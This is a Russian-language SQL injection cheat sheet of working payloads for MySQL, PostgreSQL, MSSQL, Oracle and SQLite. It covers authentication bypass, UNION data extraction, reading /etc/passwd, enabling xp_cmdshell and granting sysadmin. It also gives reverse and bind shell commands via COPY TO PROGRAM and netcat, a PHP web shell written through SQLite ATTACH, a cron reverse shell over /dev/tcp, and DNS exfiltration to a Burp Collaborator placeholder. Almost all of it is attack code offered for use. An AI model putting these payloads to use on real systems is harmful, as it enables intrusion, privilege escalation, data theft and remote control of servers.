entries.body:
Если PHP-код сравнивает raw-бинарный хеш:
  sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";

Подбираем вход, чей raw-хеш содержит кавычку и ' or '...:

SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;

-- Пример внутри select author_id,title from posts where author_id=[INJECT]
-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);

SELECT query_to_xml('select * from pg_user',true,true,''); -- все результаты одной XML-строкой
SELECT database_to_xml(true,true,'');                       -- дамп текущей БД в XML
SELECT database_to_xmlschema(true,true,'');

-- % — любое число символов, _ — ровно один символ
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'

SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);
SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';

-- проверить наличие библиотеки:
-- $ whereis lib_mysqludf_sys.so  →  /usr/lib/lib_mysqludf_sys.so

SELECT sys_eval('id');
SELECT sys_exec('id');

SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;

-- pg_read_file / pg_ls_dir
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);

-- COPY
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;

-- lo_import
SELECT lo_import('/etc/passwd');
SELECT lo_get(16420);

CREATE TABLE nc (t TEXT);
INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM nc;
COPY nc(t) TO '/tmp/nc.sh';

-- одной строкой
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';

-- Postgres 9.3+ для superuser / pg_execute_server_program
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'

CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';

declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();

SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;

-- базы
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- таблицы (xtype='U' — user table, 'V' — views)
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'

-- колонки
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');
SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)

EXEC xp_cmdshell "net user";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';

-- включить расширенные опции
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- включить xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;

-- эффективные права
SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
SELECT * FROM fn_my_permissions (NULL, 'DATABASE');

-- членство в роли
SELECT is_srvrolemember('sysadmin');

-- сделать пользователя sysadmin
EXEC master.dbo.sp_addsrvrolemember 'User', 'sysadmin';

-- базы (владельцы)
SELECT DISTINCT owner FROM all_tables;

-- таблицы
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';

-- колонки
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'

ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--

SQLite допишет magic-байты в начало файла (5351 4c69 7465 2066 6f72 6d61 7420 3300 = "SQLite format 3"). Это ломает большинство серверных скриптов, НО PHP терпим: пока в файле где-то есть тег <?php, интерпретатор игнорирует мусор перед ним и выполняет код.

Если PHP залить нельзя, но сервис работает от root — тем же приёмом пишем cron-задачу с reverse shell:
  ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
  CREATE TABLE cron.tab (dataz text);
  INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--

-- вместо information_schema.tables
SELECT * FROM mysql.innodb_table_stats;
SHOW TABLES IN dvwa;

-- вместо version()
SELECT @@innodb_version;
SELECT @@GLOBAL.VERSION;

-- вместо group_concat() (MySQL >= 5.7.22, > 16M символов)
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
